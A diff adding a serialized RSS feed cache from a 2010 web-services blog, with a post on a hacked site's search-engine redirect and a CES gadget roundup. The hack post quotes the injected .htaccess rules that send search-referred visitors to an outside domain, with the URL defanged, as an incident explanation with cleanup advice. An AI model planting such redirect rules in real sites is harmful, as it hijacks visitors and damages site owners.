@@ -1,0 +1,883 @@
+O:9:"MagpieRSS":23:{s:6:"parser";i:0;s:12:"current_item";a:0:{}s:5:"items";a:10:{i:0;a:14:{s:5:"title";s:31:"Redirecting from Search Results";s:4:"link";s:77:"http://www.pdxtc.com/wpblog/viruses-and-scams/redirected-from-search-results/";s:8:"comments";s:86:"http://www.pdxtc.com/wpblog/viruses-and-scams/redirected-from-search-results/#comments";s:7:"pubdate";s:31:"Mon, 25 Jan 2010 14:15:20 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:17:"Viruses and Scams";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1702";s:11:"description";s:338:"We just fixed an instance of a domain which appeared fine when visited directly, but when coming from the search results, all users were being redirected.
+Because of my recent personal virus experience  redirecting my visits from search results I was thrown off at first,  but it turned out that all users coming from search engines [...]";s:7:"content";a:1:{s:7:"encoded";s:4448:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fredirected-from-search-results%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fredirected-from-search-results%2F" height="61" width="51" /></a></div><p>We just fixed an instance of a domain which appeared fine when visited directly, but when coming from the search results, all users were being redirected.</p>
+<p>Because of my recent personal virus experience  <a href="../viruses-and-scams/google-search-results-redirected/" target="_blank">redirecting my visits from search results</a> I was thrown off at first,  but it turned out that <em>all users coming from search engines</em> to that website were being redirected in a completely different way.</p>
+<p>I found that the following code was placed in the .htaccess file at the root of the domain. :</p>
+<blockquote><p>RewriteCond %{HTTP_REFERER} .*google.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*ask.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*excite.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*altavista.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*msn.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*netscape.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*aol.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*goto.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*mamma.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*lycos.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*search.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*yandex.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*rambler.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*mail.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*dogpile.*</p>
+<p>RewriteRule ^(.*)$ http;//sudnijdenprishel.com/gold/go.php?sid=6 [R=301,L]</p></blockquote>
+<p><em>(* note that I replaced the colon with a semicolon in the above url)</em></p>
+<p>You can see what was happening here. the .htaccess file was either hacked, or came from the web designers computer, and it was causing all users being referred by any search engines listed to be reduirected to the sudnijdenprishel.com.</p>
+<p>I looked up the Who-is info for sudnijdenprishel.com and found this, showing the domain is brand new:</p>
+<blockquote><p>Registrant:<br />
+PrivacyProtect.org<br />
+Domain Admin        (contact@privacyprotect.org)<br />
+P.O. Box 97<br />
+Note &#8211; All Postal Mails Rejected, visit Privacyprotect.org<br />
+Moergestel<br />
+null,5066 ZH<br />
+NL<br />
+Tel. +45.36946676</p>
+<p>Creation Date: 21-Jan-2010<br />
+Expiration Date: 21-Jan-2011</p>
+<p>Domain servers in listed order:<br />
+ns2.jino.ru<br />
+ns1.jino.ru</p></blockquote>
+<p><strong>Since my search was being stymied by privacy, I tried looking up WHOIS information for jino.ru :</strong></p>
+<blockquote><p>[Querying whois.ripn.net]<br />
+[whois.ripn.net]<br />
+By submitting a query to RIPN&#8217;s Whois Service</p>
+<p>domain:     JINO.RU<br />
+type:       CORPORATE<br />
+nserver:    ns1.jino.ru. 217.107.34.200<br />
+nserver:    ns2.jino.ru. 217.107.217.16<br />
+nserver:    ns3.jino.ru. 217.107.219.170<br />
+state:      REGISTERED, DELEGATED, VERIFIED<br />
+org:        Avguro Technologies, Ltd.<br />
+phone:      +7 495 2293031<br />
+fax-no:     +7 495 2293031<br />
+e-mail:     info@jino.ru<br />
+e-mail:     info@avguro.ru<br />
+registrar:  R01-REG-RIPN<br />
+created:    2002.11.27<br />
+paid-till:  2010.11.28<br />
+source:     TCI</p></blockquote>
+<p>and fropm there, it&#8217;s not worth chasing down further, because I&#8217;m not <a href="http://www.skype.com" target="_blank">Skyping</a> into Kazakhstan.</p>
+<p>Anyway, if users claim they&#8217;re being redirected, do these things:</p>
+<ol>
+<li>Check your website .htaccess file</li>
+<li>Scan your computer for any viruses, in case you&#8217;re the source in the first place, which is often the case.</li>
+<li><a href="http://www.pdxtc.com/wpblog/spyware/you-need-better-passwords-right-now/" target="_blank">Change your FTP usernames and passwords to good ones</a> (from a clean computer) just in case your password was hacked.</li>
+</ol>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:82:"http://www.pdxtc.com/wpblog/viruses-and-scams/redirected-from-search-results/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"0";}s:7:"summary";s:338:"We just fixed an instance of a domain which appeared fine when visited directly, but when coming from the search results, all users were being redirected.
+Because of my recent personal virus experience  redirecting my visits from search results I was thrown off at first,  but it turned out that all users coming from search engines [...]";s:12:"atom_content";s:4448:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fredirected-from-search-results%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fviruses-and-scams%2Fredirected-from-search-results%2F" height="61" width="51" /></a></div><p>We just fixed an instance of a domain which appeared fine when visited directly, but when coming from the search results, all users were being redirected.</p>
+<p>Because of my recent personal virus experience  <a href="../viruses-and-scams/google-search-results-redirected/" target="_blank">redirecting my visits from search results</a> I was thrown off at first,  but it turned out that <em>all users coming from search engines</em> to that website were being redirected in a completely different way.</p>
+<p>I found that the following code was placed in the .htaccess file at the root of the domain. :</p>
+<blockquote><p>RewriteCond %{HTTP_REFERER} .*google.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*ask.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*excite.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*altavista.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*msn.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*netscape.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*aol.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*goto.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*mamma.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*lycos.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*search.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*yandex.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*rambler.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*mail.* [OR]<br />
+RewriteCond %{HTTP_REFERER} .*dogpile.*</p>
+<p>RewriteRule ^(.*)$ http;//sudnijdenprishel.com/gold/go.php?sid=6 [R=301,L]</p></blockquote>
+<p><em>(* note that I replaced the colon with a semicolon in the above url)</em></p>
+<p>You can see what was happening here. the .htaccess file was either hacked, or came from the web designers computer, and it was causing all users being referred by any search engines listed to be reduirected to the sudnijdenprishel.com.</p>
+<p>I looked up the Who-is info for sudnijdenprishel.com and found this, showing the domain is brand new:</p>
+<blockquote><p>Registrant:<br />
+PrivacyProtect.org<br />
+Domain Admin        (contact@privacyprotect.org)<br />
+P.O. Box 97<br />
+Note &#8211; All Postal Mails Rejected, visit Privacyprotect.org<br />
+Moergestel<br />
+null,5066 ZH<br />
+NL<br />
+Tel. +45.36946676</p>
+<p>Creation Date: 21-Jan-2010<br />
+Expiration Date: 21-Jan-2011</p>
+<p>Domain servers in listed order:<br />
+ns2.jino.ru<br />
+ns1.jino.ru</p></blockquote>
+<p><strong>Since my search was being stymied by privacy, I tried looking up WHOIS information for jino.ru :</strong></p>
+<blockquote><p>[Querying whois.ripn.net]<br />
+[whois.ripn.net]<br />
+By submitting a query to RIPN&#8217;s Whois Service</p>
+<p>domain:     JINO.RU<br />
+type:       CORPORATE<br />
+nserver:    ns1.jino.ru. 217.107.34.200<br />
+nserver:    ns2.jino.ru. 217.107.217.16<br />
+nserver:    ns3.jino.ru. 217.107.219.170<br />
+state:      REGISTERED, DELEGATED, VERIFIED<br />
+org:        Avguro Technologies, Ltd.<br />
+phone:      +7 495 2293031<br />
+fax-no:     +7 495 2293031<br />
+e-mail:     info@jino.ru<br />
+e-mail:     info@avguro.ru<br />
+registrar:  R01-REG-RIPN<br />
+created:    2002.11.27<br />
+paid-till:  2010.11.28<br />
+source:     TCI</p></blockquote>
+<p>and fropm there, it&#8217;s not worth chasing down further, because I&#8217;m not <a href="http://www.skype.com" target="_blank">Skyping</a> into Kazakhstan.</p>
+<p>Anyway, if users claim they&#8217;re being redirected, do these things:</p>
+<ol>
+<li>Check your website .htaccess file</li>
+<li>Scan your computer for any viruses, in case you&#8217;re the source in the first place, which is often the case.</li>
+<li><a href="http://www.pdxtc.com/wpblog/spyware/you-need-better-passwords-right-now/" target="_blank">Change your FTP usernames and passwords to good ones</a> (from a clean computer) just in case your password was hacked.</li>
+</ol>
+";s:14:"date_timestamp";i:1264428920;}i:1;a:14:{s:5:"title";s:23:"An SEO Goes to CES 2010";s:4:"link";s:50:"http://www.pdxtc.com/wpblog/ces-show/seo-ces-2010/";s:8:"comments";s:59:"http://www.pdxtc.com/wpblog/ces-show/seo-ces-2010/#comments";s:7:"pubdate";s:31:"Fri, 15 Jan 2010 14:55:20 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:55:"CES Show2010are youCESconsumer interesttechnologytrends";s:4:"guid";s:50:"http://www.pdxtc.com/wpblog/ces-show/seo-ces-2010/";s:11:"description";s:322:"My trip to the 2010 Consumer Electronics Show was unlike last year, or any other years I&#8217;ve gone, because I cut myself short on time.
+The organization of the show changed quite a bit, and in the past, all of the breakthrough inventions were situated in one giant hall, over at the Sands Expo Center.
+After last [...]";s:7:"content";a:1:{s:7:"encoded";s:21204:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fces-show%2Fseo-ces-2010%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fces-show%2Fseo-ces-2010%2F" height="61" width="51" /></a></div><p>My trip to the 2010 Consumer Electronics Show was unlike <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2009-roundup/">last year</a>, or <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2008-part-1/">any</a> other years <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2008-part-1/">I&#8217;ve gone</a>, because I cut myself short on time.</p>
+<p>The organization of the show changed quite a bit, and in the past, all of the breakthrough inventions were situated in one giant hall, over at the <a href="http://www.sandsexpo.com/" target="_blank">Sands Expo Center</a>.</p>
+<p>After last year&#8217;s downsizing of the show, I was able to make it through that entire emerging technology area in just one day, and I found myself with a lot of time on my hands, so this year I decided to only come for one day.</p>
+<p>Little did I know, that this year, likely due to the economy, they would downsize even further and cut out the Sands entirely, cramming everything together in the big convention center.</p>
+<p>To make matters worse, rather than group all of these inventions in one space, they spread them throughout the entire show on red carpeted &#8220;<a href="http://www.cesweb.org/exhibits/displays/techZones.asp"target="_blank">Tech Zone</a>&#8221; areas, so I had no choice but to try and make it through the entire show in one day.</p>
+<p>Anyone who&#8217;s ever been there before knows that it&#8217;s impossible to see everything in one day, not to mention that it&#8217;s totally impossible to find all of the separated tech zones. </p>
+<p>Amazingly, I can swear that I&#8217;d pretty much walked and jogged up and down almost every square foot of the entire North Hall, Central Hall, and Southall, along with at least two of the second floors that I can remember.</p>
+<p>It was a whirlwind tour, and something I&#8217;ll never try again, because I really do feel somewhat slighted.</p>
+<p><strong>Why Do I Attend?</strong><br />
+My goal in going each year is to seek out new technology, products, trends and inventions, then buy domain names and begin development of some web properties to start to become visible in the SERPS. </p>
+<p>Generally, in the beginning there are no revenue opportunities, but soon, as they catch on, merchants create affiliate programs,  and we&#8217;ve got several well earning sites based on thing&#8217;s I&#8217;ve discovered at CES. </p>
+<p>&nbsp;</p>
+<p><strong>CES 2010 Was in 3D</strong><br />
+What struck me most all day long, was that I saw more 3D TV signs than I could believe.  Nearly every manufacturer seems to have 3-D TVs, and nearly all of them require that you wear glasses.</p>
+<p>Having just seen Avatar in 3D, I was pretty impressed, but I&#8217;m amazed that everyone is banking on the average American family wanting to put on glasses to watch TV.</p>
+<p>In the international area, I saw aftermarket vendors of fashionable 3-D glasses, all the way down to toddler size, and it wouldn&#8217;t surprise me if you could get 3-D lenses put in a set of Ray-Ban frames.</p>
+<p>I also saw screens to go on top of your monitors and handheld multimedia devices too, that would eliminate the need to have glasses. If you&#8217;re looking at non-3-D content you just take the screen off.</p>
+<p>Only Intel had a 3-D television that did not require glasses showing, so I&#8217;m sure we can expect that having to wear glasses will soon be a thing of the past.</p>
+<p>Besides my short stay, I also apparently forgot my headset and microphone, so dictating my summary when I got back that night was impossible.</p>
+<p>Instead, I used my Blackberry to make a few audio notes, and have only now finished organizing my thoughts and photos.</p>
+<p>Here, in no particular order, are my own personal CES 2010 highlights.</p>
+<p>&nbsp;</p>
+<p><strong>BlueTooth Rear View Mirror</strong><br />
+<img class="aligncenter size-full wp-image-1645" title="IMG00107" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001071.jpg" alt="" width="450" height="337" /><br />
+Oregon has now passed a law that you can&#8217;t hold your phone to your head while you drive because steering takes two hands, so I was wondering if there would be any solar Bluetooth speakerphones, and there were.</p>
+<p>I was pretty impressed with the idea, as I wandered through the auto area, but then I came across this unit. This would be great, since I&#8217;ve usually got a dead Bluetooth headset.</p>
+<p>Caller ID scrolls across the mirror, and it&#8217;s a speakerphone AND it comes with an earpiece too, for when you prefer privacy.</p>
+<p>&nbsp;</p>
+<p><strong>USB 3.0</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00108.jpg"><img class="aligncenter size-full wp-image-1644" title="IMG00108" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00108.jpg" alt="" width="450" height="337" /></a></p>
+<p>This isn&#8217;t really a particular product it&#8217;s just a technology, which will soon be everywhere, as it becomes widely adopted standard.</p>
+<p>This is a chart showing how fast USB 3.0 or the trademarked term &#8220;super USB&#8221; &#8211; <strong>You can transfer 27 gigs in 70 seconds!</strong></p>
+<p>Unless I miss my guess, would be increased size of flash drives, and these increased speed of data transfer, there&#8217;s no reason why my entire computer won&#8217;t someday be able to fit on my USB drive.</p>
+<p>For years we have been able to boot a computer from a USB stick, but with these increased speeds it&#8217;s going to be possible to do a lot more.  It wouldn&#8217;t surprise me at all if by this time next year, I&#8217;ll bet we are able to boot to the Google OS from a USB stick, browse the web, use Google docs, check mail etc., and even store local copies of documents that are created with the Google Docs platform.</p>
+<p>If you haven&#8217;t said <a href="http://www.pdxtc.com/wpblog/google/hello-google-operating-system-goodbye-microsoft/" target="_self">goodbye to Microsoft</a> already, I&#8217;d say that&#8217;ll be the day to sell your Microsoft stock.</p>
+<p>&nbsp;</p>
+<p><strong>Data Jack</strong><br />
+<img class="aligncenter size-full wp-image-1646" title="IMG00130" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00130.jpg" alt="" width="450" height="337" /></p>
+<p>In many cases, a brick-and-mortar location may be effectively &#8220;out of business&#8221; when their Internet connection goes down and there&#8217;s a company that&#8217;s being marketed as an &#8220;Internet access backup service&#8221;.</p>
+<p>Functioning through the cellular phone provider networks GSM / 3G connections, your connectivity is assured from almost anywhere, at speeds that are about three times faster than your old dial-up connection.</p>
+<p>They also offer daisy chaining and routing capability for multiple users, so at 40 bucks a month, seems like a pretty affordable insurance policy.</p>
+<p>&nbsp;</p>
+<p><strong>Personal Cell Tower &#8211; 5barz</strong><br />
+<img class="aligncenter size-full wp-image-1647" title="IMG00162" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00162.jpg" alt="" width="450" height="337" /></p>
+<p>A clever name for a clever solution to an ever frustrating problem, this is a cellular signal repeater, it&#8217;s going to be marketed as your own personal cell tower.</p>
+<p>It works with any carrier by multiplying any signal, even under ?half a bar&#8221; into a full strength five bar connection. (Don&#8217;t ask me why they can&#8217;t just build that into phones in the first place).</p>
+<p>&nbsp;</p>
+<p><strong>Thumb ring Blue-tooth</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001661.jpg"><img class="aligncenter size-full wp-image-1649" title="IMG00166" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001661.jpg" alt="" width="450" height="337" /></a></p>
+<p>Fashion and technology are merging in many forms, and Bluetooth clothing is nothing new, but I thought this piece of jewelry was pretty slick.</p>
+<p>This is a Bluetooth cell phone accessory, with a vibrating thumb ring, with an LED display that&#8217;s large enough to read the caller ID.</p>
+<p><img class="aligncenter size-full wp-image-1650" title="IMG00165" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00165.jpg" alt="" width="450" height="337" /></p>
+<p>Should you decide to answer, simply twist it, and stick it in your ear. I  I didn&#8217;t stick around long enough to see if it had a speakerphone, but I&#8217;m guessing it does.</p>
+<p>&nbsp;</p>
+<p><strong>Man-powered Generator</strong><br />
+<img class="aligncenter size-full wp-image-1653" title="IMG00122" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00122.jpg" alt="" width="450" height="337" /></p>
+<p>What makes this unique, is that you can charge up this big box of power, and take it with you wherever you need to, since it has all of the necessary electrical connections to plug in any device from anywhere in the world.  </p>
+<p>There are adapters that allows you to use your bicycle, tricycle (so your kids can do the work), and for all I know, a hamster wheel adapter will be coming next!</p>
+<p>&nbsp;</p>
+<p><strong>The Storm &#8211; Digital TV Receiver</strong><br />
+<img class="aligncenter size-full wp-image-1654" title="IMG00129" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00129.jpg" alt="" width="450" height="337" /></p>
+<p>This dongle just plugs into your smart phone or laptop, and gives you free digital TV reception.  Of course, since free TV is probably going away entirely, its life may be limited, but it still seemed like a fun thing to have.</p>
+<p>I can remember being stuck at charity auction during a World Series game, and one of these would&#8217;ve been awesome to have. </p>
+<p>With this device, you can open up a TV screen, drag it to a second monitor, and if you&#8217;re on the road with a dual monitor laptop, you don&#8217;t have to try to figure out the hotels TV computer system <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>&nbsp;</p>
+<p><strong>Extra Laptop Monitor</strong><br />
+<img class="aligncenter size-full wp-image-1655" title="IMG00158" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00158.jpg" alt="" width="450" height="337" /></p>
+<p>Speaking of two monitors, I&#8217;m pretty spoiled with my multi-monitor setup at home, and when I travel, I can usually work just fine on my laptop. Some people though, are real road warriors, and need multiple monitors to be productive. For them, there&#8217;s now a solution.</p>
+<p>&nbsp;</p>
+<p><strong>Stylish Dresser Valet</strong><br />
+<img class="aligncenter size-full wp-image-1656" title="IMG00096" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00096.jpg" alt="" width="450" height="337" /></p>
+<p>Get rid of unsightly cord tangle, and the mess of having your E- equipment strewn all over the dresser with this stylish and fashionable electronic device caddy.</p>
+<p>Okay, maybe it&#8217;s not that technologically amazing, but it would make a pretty good Father&#8217;s Day present, wouldn&#8217;t it?</p>
+<p>&nbsp;</p>
+<p><strong>Tiny DVR</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00102.jpg"><img class="aligncenter size-full wp-image-1657" title="IMG00102" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00102.jpg" alt="" width="336" height="248" /></a></p>
+<p>The camera doesn?t do this one justice, because the guy apparently moved his hand and I had my camera on a weird zoom thing,  but it&#8217;s a full functioning DVR that records to removable Flash memory.</p>
+<p>It&#8217;s designed to be a wearable or clip on spy cam, and it has motion sensing technology, easy on off switches, and the option to have the red recording light flash or not.</p>
+<p>&nbsp;</p>
+<p><strong>Solar Wing</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001441.jpg"><img class="aligncenter size-medium wp-image-1666" title="IMG00144" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001441-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>This solar car was built as a school project by engineering students in Japan. If you look closely, you can see that in the background the pictures on the wall show that this &#8220;wing&#8221; is visible on a flying airplane. I couldn&#8217;t tell if it was an artist rendering or a photograph of an existing prototype, but I think you get the idea.</p>
+<p>&nbsp;</p>
+<p><strong>Audio Egg</strong><br />
+<img class="aligncenter size-full wp-image-1652" title="IMG00173" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00173.jpg" alt="" width="450" height="337" /></p>
+<p>Okay, I do have to admit that I was impressed by the sound. It really was every bit as good as any pair of headphones I&#8217;ve ever tried. However, with the size being roughly 400 times larger than a good set of headphones, and a limited fashion colors available, I just don&#8217;t see them becoming widely adopted.</p>
+<p>&nbsp;</p>
+<p><strong>Bone Conduction Audio</strong><br />
+<img class="aligncenter size-full wp-image-1651" title="IMG00169" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00169.jpg" alt="" width="450" height="337" /></p>
+<p>It&#8217;s probably been two years since I first tried on a set of these bone conduction headphones, but there have been some technology breakthroughs and now, their popularity is spreading.</p>
+<p>The concept is that instead of sticking something in your ear, you can more comfortably wear it on top of your ear, and the vibration in your skull actually sounds as clear as a bell, just like you wearing a standard earbud.</p>
+<p>The technology was at multiple booths, and I believe it will continue to grow in popularity since so many people absolutely hate the way some of these things feel when they are inside your ear.</p>
+<p>&nbsp;</p>
+<p><strong>65 inch HD Combo Touchscreen Monitor &amp; Interactive Whiteboard</strong><br />
+<img class="aligncenter size-full wp-image-1659" title="IMG00168" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00168.jpg" alt="" width="450" height="337" /></p>
+<p>Need I say more?</p>
+<p>&nbsp;</p>
+<p><strong>Video Game  Seating</strong><br />
+<img class="aligncenter size-full wp-image-1660" title="IMG00167" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00167.jpg" alt="" width="450" height="337" /></p>
+<p>Due to cutting myself short on time, I didn&#8217;t get to drive a single lap or single mile this year, and as a former gameaholic, it was pretty disappointing.  I didn&#8217;t get to try any of the flight seats,  cockpits, driving consoles, beanbag chairs with speakers, or any other gaming furniture that only the most spoiled children on the planet usually get to own.</p>
+<p>&nbsp;</p>
+<p><strong>Hovering Spy-Craft</strong></p>
+<p><img class="aligncenter size-full wp-image-1645" title="IMG00107" src="http://www.pdxtc.com/wpblog/wp-content/uploads/xwing.jpg" alt="" width="326" height="294" /></p>
+<p>In just a tiny booth from an inventor, this little XWing is precisely maneuverable, and you can easily hover, go forward, backwards, and make tight corners. Check out this <a href="http://www.cnet.com.au/remote-control-x-wing-storms-ces-339300327.htm"target="_blank">Cnet video</a></p>
+<p>Believe it or not, the unit can be radio controlled from up to a mile away!  Never mind the fact that you can&#8217;t see it, but the guy does claim it works from a mile away.</p>
+<p>The black ones, from a bigger vensoldor, look like little military drones, and had similar maneuverability.</p>
+<p>How long it will be before civilians can attach one of those little cameras to these drones, and it also has internet or cell access to broadcast photos?</p>
+<p>People will be flying spy vehicles around their neighborhoods from their home computers pretty soon! Here&#8217;s a still image of one, and a quick video of the Xwing.</p>
+<p>&nbsp;</p>
+<p><strong>The Hall of Innovations</strong><br />
+I usually linger for a couple of hours in here, since  it&#8217;s where the awards are given for best of the show gone through the best of the entire show. This year though, I had to plow through pretty quickly, trying to reading the description lines of each sign, but I&#8217;m sure I missed some cool stuff. In many cases the device was too small or obscure looking, so it took a picture of the sign instead.</p>
+<p>&nbsp;</p>
+<p><strong>Start Your Car with an iPhone</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001522.jpg"><img class="aligncenter size-medium wp-image-1667" title="IMG00152" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001522-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>This is an iPhone app that will unlock or even start your vehicle. I hope there are safety precautions that would prevent you from starting a manual transmission vehicle while in gear, jumping it through your garage wall!</p>
+<p>&nbsp;</p>
+<p><strong>Power Line Gigabit Networking</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00153.jpg"><img class="aligncenter size-medium wp-image-1668" title="IMG00153" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00153-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>I really don&#8217;t know how slowly data used to travel over a network, but in 1997, if I had networked your office, we would&#8217;ve run cable everywhere in your office that a computer needed to be.</p>
+<p>Although there was technology for running data over phone lines, and even running data over all electrical lines, it never really caught on, and data typically traveled at 10 mb,  and it was quickly multiplied by 10 times, and 100mbs became the norm.  That jumped by 10 again, as 1000mb, or Gigabit speeds were introduced and today&#8217;s standard is &#8220;gigabit networking&#8221;.</p>
+<p>Now, gigabit speeds are available directly over your power lines, so no additional wiring is necessary beyond regular electrical.   Since this is 10 times faster than wireless, computers support it natively, right through their ethernet port,  it sure sounds to me like it&#8217;s poised to take over as the industry standard. Does new construction still typically have ethernet cable run?  I&#8217;ll bet it won&#8217;t for much longer&#8230;</p>
+<p>&nbsp;</p>
+<p><strong>Family Storage and Networked<br />
+BluRay</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001542.jpg"><img class="aligncenter size-medium wp-image-1669" title="IMG00154" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001542-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>An LG network storage device that was (umpteen?) terabytes in size, and even had a built-in Blu-Ray player to watch movies from anywhere in your home.</p>
+<p>&nbsp;</p>
+<p><strong>Built In Speakers</strong><br />
+<img class="aligncenter size-full wp-image-1670" title="IMG00156" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001561.jpg" alt="" width="450" height="337" /></p>
+<p>Speakers are being built into everyday devices, in all sorts of furniture and appliances.  The technology really surrounds you in sound, and sounds great even over wireless connections. with no freestanding speakers to worry about and even no speaker wire for some of the models, I?m sure there?s lots more to come.</p>
+<p>&nbsp;</p>
+<p><strong>The Dorky Geektoy Award</strong><br />
+<img class="aligncenter size-full wp-image-1671" title="IMG00164" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00164.jpg" alt="" width="450" height="337" /></p>
+<p>Last year, the silliest thing I saw, (although functional) was a wire coat-hanger type device for holding your cell phone to your head to be &#8220;hands free&#8221;&#8230; seriously.</p>
+<p>Does this look equally as silly when you wear it?  Um, yeah&#8230;</p>
+<p><img class="aligncenter size-full wp-image-1672" title="IMG00163" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00163.jpg" alt="" width="450" height="337" /><br />
+Hat&#8217;s off, (literally) to this thing, designed to tuck your iPhone into the holder at the end of the visor, then slap it on your head, and put on your headphones, retreating into your own little universe of &#8220;private&#8221; viewing. Amazing.</p>
+<p>I have a few things I&#8217;ve held back, primarily because my wrists are sore, they weren&#8217;t that fascinating, or in a couple of cases, I need to get a site up first, before touting the technology.  <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>Next year I&#8217;m definitely staying for at least two full days&#8230;</p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:55:"http://www.pdxtc.com/wpblog/ces-show/seo-ces-2010/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"2";}s:7:"summary";s:322:"My trip to the 2010 Consumer Electronics Show was unlike last year, or any other years I&#8217;ve gone, because I cut myself short on time.
+The organization of the show changed quite a bit, and in the past, all of the breakthrough inventions were situated in one giant hall, over at the Sands Expo Center.
